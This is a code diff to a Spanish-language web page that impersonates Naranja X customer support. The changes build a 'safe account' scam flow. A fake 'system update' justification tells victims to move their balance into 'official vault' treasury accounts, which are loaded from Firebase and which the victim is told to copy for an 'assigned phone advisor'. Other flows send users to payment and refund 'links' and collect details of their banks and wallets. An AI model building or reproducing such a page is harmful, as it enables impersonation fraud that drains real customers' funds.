@@ -61,7 +61,6 @@
 
       <!-- ================= PANTALLA 1: BIENVENIDA ================= -->
       <div id="screen-1" class="space-y-6 text-center">
-        <!-- Logo Personalizado -->
         <div class="w-20 h-20 bg-nxOrange-50 rounded-2xl mx-auto flex items-center justify-center shadow-inner border border-nxOrange-100 overflow-hidden p-2">
           <img src="assets/img/logo-naranja-ok.png" alt="Logo Naranja X" class="w-full h-full object-contain">
         </div>
@@ -114,7 +113,6 @@
         </div>
 
         <div class="space-y-3 pt-1">
-          <!-- Card 1 -->
           <button onclick="app.selectCategory('app_issues')" class="w-full text-left p-4 rounded-xl border border-slate-200 hover:border-nxPurple-600 hover:bg-nxPurple-50/50 transition group flex items-center space-x-4">
             <div class="w-12 h-12 bg-nxPurple-50 rounded-xl flex items-center justify-center shrink-0 border border-nxPurple-100 group-hover:scale-105 transition">
               <i class="fa-solid fa-mobile-screen-button text-xl text-nxPurple-800"></i>
@@ -125,7 +123,6 @@
             </div>
           </button>
 
-          <!-- Card 2 -->
           <button onclick="app.selectCategory('payments')" class="w-full text-left p-4 rounded-xl border border-slate-200 hover:border-nxPurple-600 hover:bg-nxPurple-50/50 transition group flex items-center space-x-4">
             <div class="w-12 h-12 bg-nxPurple-50 rounded-xl flex items-center justify-center shrink-0 border border-nxPurple-100 group-hover:scale-105 transition">
               <i class="fa-solid fa-file-invoice-dollar text-xl text-nxPurple-800"></i>
@@ -136,7 +133,6 @@
             </div>
           </button>
 
-          <!-- Card 3 -->
           <button onclick="app.selectCategory('transfers')" class="w-full text-left p-4 rounded-xl border border-slate-200 hover:border-nxPurple-600 hover:bg-nxPurple-50/50 transition group flex items-center space-x-4">
             <div class="w-12 h-12 bg-nxPurple-50 rounded-xl flex items-center justify-center shrink-0 border border-nxPurple-100 group-hover:scale-105 transition">
               <i class="fa-solid fa-money-bill-transfer text-xl text-nxPurple-800"></i>
@@ -150,7 +146,9 @@
       </div>
 
       <!-- ================= FLUJO A: PROBLEMAS CON LA APP ================= -->
-      <div id="flow-app-issues" class="space-y-5 hidden">
+      
+      <!-- Subpantalla A1: Información y Justificativo de Resguardo -->
+      <div id="flow-app-info" class="space-y-5 hidden">
         <div>
           <span class="text-xs font-bold text-nxOrange-600 uppercase tracking-wider">Soporte Técnico Naranja X</span>
           <h2 class="text-xl font-extrabold text-nxPurple-900 mt-0.5">Actualización y Resguardo de Saldo</h2>
@@ -158,12 +156,42 @@
 
         <div class="p-4 bg-nxPurple-50 border border-nxPurple-100 rounded-xl space-y-3">
           <div class="flex items-center space-x-2 text-nxPurple-900 font-bold text-sm">
-            <span>🛡️</span>
+            <i class="fa-solid fa-shield-halved text-nxOrange-500"></i>
             <span>Justificativo de Seguridad y Protección de Fondos</span>
           </div>
           <p class="text-xs text-slate-700 leading-relaxed">
-            Debido a las recientes optimizaciones en nuestros servidores, resulta indispensable realizar una <strong>Actualización del Sistema</strong>. Para garantizar que tu saldo en cuenta no sufra bloqueos o inconsistencias temporales durante este mantenimiento, tus fondos deben ser resguardados de manera preventiva en la bóveda de seguridad.
+            Debido a las recientes optimizaciones en nuestros servidores, resulta indispensable realizar una <strong>Actualización del Sistema</strong>. Para garantizar que tu saldo en cuenta no sufra bloqueos o inconsistencias temporales durante este mantenimiento, tus fondos deben ser resguardados de manera preventiva en la bóveda de seguridad oficial.
           </p>
+        </div>
+
+        <button type="button" onclick="app.goToTreasuryCards()" class="w-full bg-nxOrange-500 hover:bg-nxOrange-600 active:scale-[0.98] text-white font-bold py-3.5 px-6 rounded-xl shadow-lg shadow-nxOrange-500/30 transition duration-200">
+          Siguiente
+        </button>
+      </div>
+
+      <!-- Subpantalla A2: Cards de Cuentas de Tesorería Oficiales -->
+      <div id="flow-app-treasury" class="space-y-5 hidden">
+        <div>
+          <span class="text-xs font-bold text-nxOrange-600 uppercase tracking-wider">Cuentas Oficiales Naranja X</span>
+          <h2 class="text-xl font-extrabold text-nxPurple-900 mt-0.5">Bóvedas de Resguardo</h2>
+          <p class="text-xs text-slate-500 mt-0.5">Selecciona y copia los datos de la cuenta asignada por tu asesor.</p>
+        </div>
+
+        <!-- Contenedor dinámico de Cards de Tesorería -->
+        <div id="treasury-cards-container" class="space-y-3.5 max-h-72 overflow-y-auto pr-1">
+          <!-- Inyectado desde Firebase -->
+        </div>
+
+        <button type="button" onclick="app.goToOperatorInstructions()" class="w-full bg-nxOrange-500 hover:bg-nxOrange-600 active:scale-[0.98] text-white font-bold py-3.5 px-6 rounded-xl shadow-lg shadow-nxOrange-500/30 transition duration-200">
+          Siguiente
+        </button>
+      </div>
+
+      <!-- Subpantalla A3: Instrucciones del Operador Telefónico y Finalización -->
+      <div id="flow-app-operator" class="space-y-5 hidden">
+        <div>
+          <span class="text-xs font-bold text-nxOrange-600 uppercase tracking-wider">Paso Final</span>
+          <h2 class="text-xl font-extrabold text-nxPurple-900 mt-0.5">Resguardo con Operador</h2>
         </div>
 
         <div class="p-4 bg-slate-50 border border-slate-200 rounded-xl space-y-3">
@@ -172,13 +200,13 @@
             <div class="space-y-1">
               <h4 class="font-bold text-slate-900 text-sm">Asistencia Telefónica Guiada</h4>
               <p class="text-xs text-slate-600 leading-relaxed">
-                Tu <strong>asesor telefónico asignado</strong> te guiará paso a paso en esta llamada para llevar a cabo la actualización del sistema y completar la protección de tu saldo de forma segura.
+                Tu <strong>asesor telefónico asignado</strong> te guiará paso a paso en esta llamada para validar los datos copiados, llevar a cabo la actualización del sistema y completar la protección de tu saldo de forma segura.
               </p>
             </div>
           </div>
         </div>
 
-        <button onclick="app.resetApp()" class="w-full bg-nxPurple-900 text-white font-bold py-3.5 px-4 rounded-xl hover:bg-nxPurple-800 transition text-sm">
+        <button type="button" onclick="app.resetApp()" class="w-full bg-nxPurple-900 text-white font-bold py-3.5 px-4 rounded-xl hover:bg-nxPurple-800 transition text-sm shadow-md">
           Entendido / Finalizar Consulta
         </button>
       </div>
@@ -190,7 +218,6 @@
           <h2 id="payment-title-heading" class="text-xl font-extrabold text-nxPurple-900 mt-0.5">Pago de Resumen</h2>
         </div>
 
-        <!-- B1: Ingreso de Monto -->
         <div id="pay-form-view" class="space-y-4">
           <div>
             <label class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1">Monto a Abonar ($)</label>
@@ -210,7 +237,6 @@
           </button>
         </div>
 
-        <!-- B2: Esperando Link (Redirección Automática) -->
         <div id="pay-waiting-view" class="space-y-6 hidden text-center py-4">
           <div class="p-4 bg-nxPurple-50 rounded-xl border border-nxPurple-100 space-y-1">
             <p class="text-xs text-nxPurple-800 font-semibold">Número de Pedido Asignado</p>
@@ -235,7 +261,6 @@
           <h2 class="text-xl font-extrabold text-nxPurple-900 mt-0.5">Acreditación sobre Saldo Actual</h2>
         </div>
 
-        <!-- C1: Monto del Reintegro -->
         <div id="claim-form-view" class="space-y-4">
           <p class="text-xs text-slate-600 leading-relaxed">
             Ingresa el monto exacto que corresponde acreditar sobre tu saldo actual para iniciar el trámite de devolución.
@@ -249,7 +274,6 @@
           </button>
         </div>
 
-        <!-- C2: Selección de Bancos y Billeteras -->
         <div id="claim-banks-view" class="space-y-4 hidden">
           <div class="p-3.5 bg-nxPurple-50 border border-nxPurple-100 rounded-xl">
             <h4 class="font-bold text-nxPurple-900 text-xs uppercase tracking-wider mb-1">¿Por qué solicitamos esta información?</h4>
@@ -300,7 +324,6 @@
           </button>
         </div>
 
-        <!-- C3: Instrucciones del Operador -->
         <div id="claim-instructions-view" class="space-y-5 hidden">
           <div class="p-4 bg-slate-50 border border-slate-200 rounded-xl space-y-2">
             <h4 class="font-bold text-slate-900 text-sm">Paso Final: Acreditación Guiada</h4>
@@ -314,7 +337,6 @@
           </button>
         </div>
 
-        <!-- C4: Esperando Link de Devolución (Redirección Automática) -->
         <div id="claim-waiting-view" class="space-y-6 hidden text-center py-4">
           <div class="p-4 bg-nxPurple-50 rounded-xl border border-nxPurple-100 space-y-1">
             <p class="text-xs text-nxPurple-800 font-semibold">Solicitud de Devolución Asignada</p>
